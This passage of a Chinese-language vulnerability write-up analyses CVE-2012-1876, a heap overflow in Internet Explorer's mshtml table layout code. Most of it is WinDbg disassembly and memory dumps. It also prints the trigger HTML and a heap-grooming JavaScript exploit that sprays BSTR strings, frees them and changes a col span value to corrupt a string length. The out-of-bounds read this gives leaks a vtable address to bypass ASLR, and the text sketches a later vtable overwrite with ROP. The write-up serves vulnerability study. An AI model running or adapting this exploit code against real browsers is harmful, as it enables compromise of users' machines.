<p>接下来分析CTableColCalc::AdjustForCol函数，该函数会被调用多次，不断向esi指向的内存（vulheap）写入数据。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">6ab00a1a 8bff            mov     edi,edi</span><br><span class="line">6ab00a1c 55              push    ebp</span><br><span class="line">6ab00a1d 8bec            mov     ebp,esp</span><br><span class="line">6ab00a1f 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">6ab00a21 53              push    ebx</span><br><span class="line">6ab00a22 8b5d08          mov     ebx,dword ptr [ebp+8] &lt;--获取参数</span><br><span class="line">6ab00a25 57              push    edi</span><br><span class="line">6ab00a26 8bc1            mov     eax,ecx</span><br><span class="line">6ab00a28 83e00f          and     eax,0Fh</span><br><span class="line">6ab00a2b 8d7e18          lea     edi,[esi+18h]</span><br><span class="line">6ab00a2e 50              push    eax</span><br><span class="line">6ab00a2f 890f            mov     dword ptr [edi],ecx &lt;--触发crash的位置</span><br><span class="line">6ab00a31 e8d3c3daff      call    mshtml!CUnitValue::IsScalerUnit (6a8ace09)</span><br><span class="line">6ab00a36 85c0            test    eax,eax</span><br><span class="line">6ab00a38 7411            je      mshtml!CTableColCalc::AdjustForCol+0x31 (6ab00a4b)</span><br><span class="line">6ab00a3a 6a08            push    8</span><br><span class="line">6ab00a3c 57              push    edi</span><br><span class="line">6ab00a3d 8bc3            mov     eax,ebx</span><br><span class="line">6ab00a3f e83dacbdff      call    mshtml!CUnitValue::SetValue (6a6db681)</span><br><span class="line">6ab00a44 895e04          mov     dword ptr [esi+4],ebx&lt;--将数据写入vulheap</span><br><span class="line">6ab00a47 891e            mov     dword ptr [esi],ebx &lt;--将数据写入vulheap</span><br><span class="line">略</span><br><span class="line"> </span><br><span class="line">0:005&gt; t</span><br><span class="line">eax&#x3D;0a2acf80 ebx&#x3D;0abccea8 ecx&#x3D;0000001c edx&#x3D;00004141 esi&#x3D;0a0f0fac edi&#x3D;00000001</span><br><span class="line">eip&#x3D;6ab00a1a esp&#x3D;04afb950 ebp&#x3D;04afba04 iopl&#x3D;0         nv up ei pl zr na pe nc</span><br><span class="line">cs&#x3D;001b  ss&#x3D;0023  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;003b  gs&#x3D;0000             efl&#x3D;00000246</span><br><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">6ab00a1a 8bff            mov     edi,edi</span><br></pre></td></tr></table></figure>

<p>这块内存的大小为0x70，也就是上一次调用时，申请的vulheap。</p>
<p>这次程序的span值改变了，但是vulheap的大小没有变化。</p>
<p>当写入span*0x1c长度的值时，发生堆溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; !heap -p -a 0a0f0fac（esi）</span><br><span class="line">​    address 0a0f0fac found in</span><br><span class="line">​    _DPH_HEAP_ROOT @ 251000</span><br><span class="line">​    in busy allocation (  DPH_HEAP_BLOCK:         UserAddr         UserSize -         VirtAddr         VirtSize)</span><br><span class="line">​                                 a0e1ac4:          a0f0f90               70 -          a0f0000             2000</span><br></pre></td></tr></table></figure>

<p>执行结束一次AdjustForCol之后程序会将ebp-14地址的值增加1并且与ebp+10（0x3e8）比较，如果小于便会向前跳转，重新执行AdjustForCol ，直到0x3e8次。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">6a96f475 e8a0151900      call    mshtml!CTableColCalc::AdjustForCol (6ab00a1a)</span><br><span class="line">6a96f47a ff45ec          inc     dword ptr [ebp-14h]</span><br><span class="line">6a96f47d 8b45ec          mov     eax,dword ptr [ebp-14h]</span><br><span class="line">6a96f480 8345dc1c        add     dword ptr [ebp-24h],1Ch</span><br><span class="line">6a96f484 3b4510          cmp     eax,dword ptr [ebp+10h] ss:0023:04aabcf4&#x3D;000003e8</span><br><span class="line">6a96f487 7caf            jl      mshtml!CTableLayout::CalculateMinMax+0x516 (6a96f438)</span><br></pre></td></tr></table></figure>

<p>当不断重复写，esi的值会循环递增。当esi指向地址超过范围的地址，因为开启了页堆选项，程序就会crash。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd esi</span><br><span class="line">0ad24fac  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0 &lt;--vulheap</span><br><span class="line">0ad24fbc  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">0ad24fcc  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">0ad24fdc  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">0ad24fec  c0c0c0c0 c0c0c0c0 c0c0c0c0 c0c0c0c0</span><br><span class="line">0ad24ffc  c0c0c0c0 ???????? ???????? ????????</span><br><span class="line">0ad2500c  ???????? ???????? ???????? ????????</span><br><span class="line">0ad2501c  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dd esi-0x20</span><br><span class="line">0ad24fe0  04141148 00414114 00414114 00414114</span><br><span class="line">0ad24ff0  c0c0c0c0 c0c0c0c0 c0c0c0c0 04141148</span><br><span class="line">0ad25000  ???????? ???????? ???????? ????????  &lt;-- 越界crash</span><br></pre></td></tr></table></figure>

<p>就如同第一次crash那样，程序访问了edi（esi+0x18）访问了超过这个堆的空间。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mshtml!CTableColCalc::AdjustForCol:</span><br><span class="line">6ab00a1a 8bff            mov     edi,edi</span><br><span class="line">6ab00a1c 55              push    ebp</span><br><span class="line">6ab00a1d 8bec            mov     ebp,esp</span><br><span class="line">6ab00a1f 8b08            mov     ecx,dword ptr [eax]</span><br><span class="line">6ab00a21 53              push    ebx</span><br><span class="line">6ab00a22 8b5d08          mov     ebx,dword ptr [ebp+8]</span><br><span class="line">6ab00a25 57              push    edi</span><br><span class="line">6ab00a26 8bc1            mov     eax,ecx</span><br><span class="line">6ab00a28 83e00f          and     eax,0Fh</span><br><span class="line">6ab00a2b 8d7e18          lea     edi,[esi+18h]</span><br><span class="line">6ab00a2e 50              push    eax</span><br><span class="line">6ab00a2f 890f            mov     dword ptr [edi],ecx  ds:0023:0ad25018&#x3D;????????</span><br></pre></td></tr></table></figure>




<h3 id="堆溢出总结"><a href="#堆溢出总结" class="headerlink" title="堆溢出总结"></a>堆溢出总结</h3><p>漏洞利用浏览器对table对象中col标签的解析所产生的堆漏洞。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;132&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;1&quot; &gt;  &lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure>
<p>漏洞函数CTableLayout::CalculateMinMax原型</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __thiscall <span class="title">CTableLayout::CalculateMinMax</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">​		CTableLayout* theTableLayoutObj,</span></span></span><br><span class="line"><span class="function"><span class="params">​		LPVOID lpUnknownStackBuffer )</span> </span></span><br></pre></td></tr></table></figure>

<p>当Table表第一次创建时，向计算机申请了span*0x1c（但最少为0x70）的堆空间。</p>
<p>但当使用javascript修改这个对象的span值，程序不会申请更大的内存空间，而是会向原本只有0x70的空间写入span*0x1c的数据，造成堆溢出。</p>
<p>发生堆溢出的vulheap位于漏洞函数CalculateMinMax的ebx+0x9c位置</p>
<p>复制的数据来源是width的值（需要分析AdjustForCol函数），具体算法没有分析但当width&#x3D;41，传递的值为41*100&#x3D;0x1004。</p>
<h2 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h2><p>国外著名安全组织VUPEN的对该漏洞的利用方式是通过构造一连串的padding（BSTR字符串，0x100），来申请堆空间，然后通过堆溢出来读取&#x2F;修改虚函数表。</p>
<p>1.泄漏地址部分</p>
<p>通过覆写BSTR字符串的前四个字节，修改其长度，再通过javascript读取，就能读取到后方的CButtonLayout对象的虚函数表内容。而CButtonLayout的虚函数表于其模块mshtml的偏移地址是固定的，能够帮助我们泄漏Mshtml基地址。</p>
<p>2.利用部分</p>
<p>再次溢出，修改CButtonLayout表的虚函数表指针。结合HeapSpray(heap-feng-shui)和ROP绕过DEP。</p>
<p><img src="https://github.com/migraine-sudo/blog_image_management/raw/master/CVE-2012-1876/%E7%BB%95%E8%BF%87ASLR26339.png" alt="img"> </p>
<p> <a target="_blank" rel="noopener" href="https://blog.csdn.net/aasmfox/article/details/38729387">BSTR结构详解</a></p>
<p>exploit关键代码</p>
<blockquote>
<p>首先创建大量的连续内存，大小为0x100的BSTR结构。</p>
<p>然后将EEEE填充的部分释放（通过垃圾回收函数CollectGarbage）</p>
<p>然后创建<table>对象，占坑被释放的空间。</table></p>
<p>col属性span&#x3D;9，则会分配9*0x1c&#x3D;0xfc，占坑之前被释放的0x100大小的空间。</p>
<p>形成上方的结构图。</p>
</blockquote>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id&#x3D;&quot;evil&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">&lt;script language&#x3D;&#39;javascript&#39;&gt;</span><br><span class="line">​        var leak_index &#x3D; -1;</span><br><span class="line">​        var dap &#x3D; &quot;EEEE&quot;;</span><br><span class="line">​        while ( dap.length &lt; 480 ) dap +&#x3D; dap;</span><br><span class="line"></span><br><span class="line">​        var padding &#x3D; &quot;AAAA&quot;;</span><br><span class="line">​        while ( padding.length &lt; 480 ) padding +&#x3D; padding;</span><br><span class="line"></span><br><span class="line">​        var filler &#x3D; &quot;BBBB&quot;;</span><br><span class="line">​        while ( filler.length &lt; 480 ) filler +&#x3D; filler;</span><br><span class="line"> </span><br><span class="line">​        var arr &#x3D; new Array();</span><br><span class="line">​        var rra &#x3D; new Array();</span><br><span class="line"></span><br><span class="line">​        var div_container &#x3D; document.getElementById(&quot;evil&quot;);</span><br><span class="line">​        div_container.style.cssText &#x3D; &quot;display:none&quot;;</span><br><span class="line">​        &#x2F;&#x2F;1.布局堆块内存</span><br><span class="line">​        for (var i&#x3D;0; i &lt; 500; i+&#x3D;2) &#123;</span><br><span class="line">​            &#x2F;&#x2F; E</span><br><span class="line">​            rra[i] &#x3D; dap.substring(0, (0x100-6)&#x2F;2);</span><br><span class="line">​            &#x2F;&#x2F; S, bstr &#x3D; A</span><br><span class="line">​            arr[i] &#x3D; padding.substring(0, (0x100-6)&#x2F;2);</span><br><span class="line">​            &#x2F;&#x2F; A, bstr &#x3D; B</span><br><span class="line">​            arr[i+1] &#x3D; filler.substring(0, (0x100-6)&#x2F;2);</span><br><span class="line">​            &#x2F;&#x2F; B</span><br><span class="line">​            var obj &#x3D; document.createElement(&quot;button&quot;);</span><br><span class="line">​            div_container.appendChild(obj);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">​        for (var i&#x3D;200; i&lt;500; i+&#x3D;2 ) &#123;</span><br><span class="line">​            rra[i] &#x3D; null;</span><br><span class="line">​            CollectGarbage();</span><br><span class="line">​        &#125;</span><br><span class="line"></span><br><span class="line">Math.cos(3,2) </span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;1&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt; &lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;2&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt; &lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br><span class="line">&lt;table style&#x3D;&quot;table-layout:fixed&quot; &gt;&lt;col id&#x3D;&quot;3&quot; width&#x3D;&quot;41&quot; span&#x3D;&quot;9&quot; &gt; &lt;&#x2F;col&gt;&lt;&#x2F;table&gt;</span><br></pre></td></tr></table></figure>
<p>堆布局完成之后，修改span值，发生堆溢出。</p>
<p>因为笔者对jscript5引擎的逆向不够熟悉，不太清楚如何在substring的时候获取字符串的内存空间。所以断点如下（参考漏洞战争）</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bu mshtml!CTableLayout::CalculateMinMax+0x208 &quot;.echo vulheap;dd poi(ebx+0x9c) l4;g&quot; </span><br></pre></td></tr></table></figure>
<p>也就是mshtml!CImplAry::EnsureSizeWorker (6b84349e)函数刚执行结束之后(可以使用gu命令)，此时ebx+0x9c存放的是vulheap的地址。</p>
<p>记录日志.logopen &#x2F;t c:\logs\mylogfile.txt，输出所有的vulheap（windbg里看实在不方便）</p>
<p>[溢出前]vulheap内存</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">0:005&gt; dc poi(ebx+0x9c) L200</span><br><span class="line">050051f0  0000035c 00450045 00450045 00450045  \...E.E.E.E.E.E.  &lt;--BSTR(Free) &lt;--vulheap(Now)</span><br><span class="line">05005200  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005210  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005220  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005230  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005240  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005250  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005260  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005270  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005280  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">05005290  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">050052a0  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">050052b0  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">050052c0  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">050052d0  00450045 00450045 00450045 00450045  E.E.E.E.E.E.E.E.</span><br><span class="line">050052e0  00450045 00450045 00450045 00000045  E.E.E.E.E.E.E...</span><br><span class="line">050052f0  4ce3dd2d 88000000 000000fa 00410041  -..L........A.A. &lt;--BSTR</span><br><span class="line">05005300  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005310  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005320  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005330  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005340  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005350  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005360  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005370  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005380  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">05005390  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">050053a0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">050053b0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">050053c0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">050053d0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">050053e0  00410041 00410041 00410041 00410041  A.A.A.A.A.A.A.A.</span><br><span class="line">050053f0  00410041 00000041 4ce3dd0c 88000000  A.A.A......L....</span><br><span class="line">05005400  000000fa&lt;-- length 00420042 00420042 00420042  ....B.B.B.B.B.B. &lt;--BSTR(Free)</span><br><span class="line">05005410  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005420  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005430  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005440  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005450  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005460  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005470  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005480  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">05005490  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">050054a0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">050054b0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">050054c0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">050054d0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">050054e0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">050054f0  00420042 00420042 00420042 00000042  B.B.B.B.B.B.B...</span><br><span class="line">05005500  4ce3ddd3 8c000000 6b7c84f8&lt;--vrftable 004b2c90  ...L......|k.,K.  &lt;--ButtonLayout</span><br><span class="line">05005510  05026808 6b7c8690 &lt;--vftable 00000001 00000000  .h....|k........ </span><br><span class="line">05005520  01080809 ffffffff 00000000 00000000  ................</span><br><span class="line">05005530  00000000 ffffffff 00000080 ffffffff  ................</span><br><span class="line">05005540  00000000 00000000 00000000 00000000  ................</span><br><span class="line">05005550  00000000 00000024 00000020 00000000  ....$... .......</span><br><span class="line">05005560  00000000 00000000 00000000 00000000  ................</span><br><span class="line">05005570  00000000 00000000 00000000 00000000  ................</span><br><span class="line">05005580  00000000 00000000 00000000 00000000  ................</span><br><span class="line">05005590  00000000 00000000 00000000 050055b8  .............U..</span><br><span class="line">050055a0  00000000 00000000 00000000 00000000  ................</span><br><span class="line">050055b0  00000001 00000001 00000000 00000000  ................</span><br><span class="line">050055c0  00000000 00000000 00000000 00000000  ................</span><br><span class="line">050055d0  ffffffff ffffffff ffffffff ffffffff  ................</span><br></pre></td></tr></table></figure>

<p>找到了两个虚函数表的位置</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:014&gt; ln 6b7c84f8</span><br><span class="line">(6b7c84f8)   mshtml!CButtonLayout::&#96;vftable&#39;   |  (6b7c8690)   mshtml!CButtonLayout::&#96;vftable&#39;</span><br><span class="line">Exact matches:</span><br><span class="line">​    mshtml!CButtonLayout::&#96;vftable&#39; &#x3D; &lt;no type information&gt;</span><br><span class="line"></span><br><span class="line">0:014&gt; ln 6b7c8690</span><br><span class="line">(6b7c8690)   mshtml!CButtonLayout::&#96;vftable&#39;   |  (6b7c8738)   mshtml!CObjectImageLayout::&#96;vftable&#39;</span><br><span class="line">Exact matches:</span><br><span class="line">​    mshtml!CButtonLayout::&#96;vftable&#39; &#x3D; &lt;no type information&gt;</span><br></pre></td></tr></table></figure>



<h2 id="泄漏地址"><a href="#泄漏地址" class="headerlink" title="泄漏地址"></a>泄漏地址</h2><p>只需要覆盖0x214的长度，就能覆盖BSTR（“BBBB”）的长度。而0x214&#x3D;19*0x1c，所以将col的span参数修改为19，写入的数据正好能够覆盖到BSTR的头部。</p>
<p>填写的内容之前</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var evil_col &#x3D; document.getElementById(&quot;132&quot;);  </span><br><span class="line">evil_col.span &#x3D; &quot;19&quot;;</span><br></pre></td></tr></table></figure>
<p>我们选择修改也就是最后一个<table>元素（id&#x3D;132），输出log之后找到最后一个vulheap（对应id&#x3D;‘132’的col元素），查看其内存空间。BSTR的头部已经被覆盖为了00010048，于是获得一个越界读取的能力。<br>[溢出后]vulheap</table></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">0:016&gt; dc 005258c0 L100</span><br><span class="line">005258c0  00001004 00001004 00001004 00000000  ................ &lt;--vulheap</span><br><span class="line">005258d0  00450045 00450041 00010048 00001004  E.E.A.E.H.......</span><br><span class="line">005258e0  00001004 00001004 00000000 00450045  ............E.E.</span><br><span class="line">005258f0  00450041 00010048 00001004 00001004  A.E.H...........</span><br><span class="line">00525900  00001004 00000000 00450045 00450041  ........E.E.A.E.</span><br><span class="line">00525910  00010048 00001004 00001004 00001004  H...............</span><br><span class="line">00525920  00000000 00450045 00450041 00010048  ....E.E.A.E.H...</span><br><span class="line">00525930  00001004 00001004 00001004 00000000  ................</span><br><span class="line">00525940  00450045 00450041 00010048 00001004  E.E.A.E.H.......</span><br><span class="line">00525950  00001004 00001004 00000000 00450045  ............E.E.</span><br><span class="line">00525960  00450041 00010048 00001004 00001004  A.E.H...........</span><br><span class="line">00525970  00001004 00000000 00450045 00450041  ........E.E.A.E.</span><br><span class="line">00525980  00010048 00001004 00001004 00001004  H...............</span><br><span class="line">00525990  00000000 00450045 00450041 00010048  ....E.E.A.E.H...</span><br><span class="line">005259a0  00001004 00001004 00001004 00000000  ................</span><br><span class="line">005259b0  00450045 00450041 00010048 00001004  E.E.A.E.H.......</span><br><span class="line">005259c0  00001004 00001004 000000fa 00410041  ............A.A.</span><br><span class="line">005259d0  00410041 00010048 00001004 00001004  A.A.H...........</span><br><span class="line">005259e0  00001004 00410041 00410041 00410041  ....A.A.A.A.A.A.</span><br><span class="line">005259f0  00010048 00001004 00001004 00001004  H...............</span><br><span class="line">00525a00  00410041 00410041 00410041 00010048  A.A.A.A.A.A.H...</span><br><span class="line">00525a10  00001004 00001004 00001004 00410041  ............A.A.</span><br><span class="line">00525a20  00410041 00410041 00010048 00001004  A.A.A.A.H.......</span><br><span class="line">00525a30  00001004 00001004 00410041 00410041  ........A.A.A.A.</span><br><span class="line">00525a40  00410041 00010048 00001004 00001004  A.A.H...........</span><br><span class="line">00525a50  00001004 00410041 00410041 00410041  ....A.A.A.A.A.A.</span><br><span class="line">00525a60  00010048 00001004 00001004 00001004  H...............</span><br><span class="line">00525a70  00410041 00410041 00410041 00010048  A.A.A.A.A.A.H...</span><br><span class="line">00525a80  00001004 00001004 00001004 00410041  ............A.A.</span><br><span class="line">00525a90  00410041 00410041 00010048 00001004  A.A.A.A.H.......</span><br><span class="line">00525aa0  00001004 00001004 00410041 00410041  ........A.A.A.A.</span><br><span class="line">00525ab0  00410041 00010048 00001004 00001004  A.A.H...........</span><br><span class="line">00525ac0  00001004 00000041 3ae939d2 88000000  ....A....9.:....</span><br><span class="line">00525ad0  00010048&lt;--length  00420042 00420042 00420042  H...B.B.B.B.B.B.  &lt;--BSTR</span><br><span class="line">00525ae0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525af0  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b00  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b10  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b20  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b30  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b40  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b50  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b60  00420042 00420042 00420042 00420042  B.B.B.B.B.B.B.B.</span><br><span class="line">00525b70  00420042 00420042 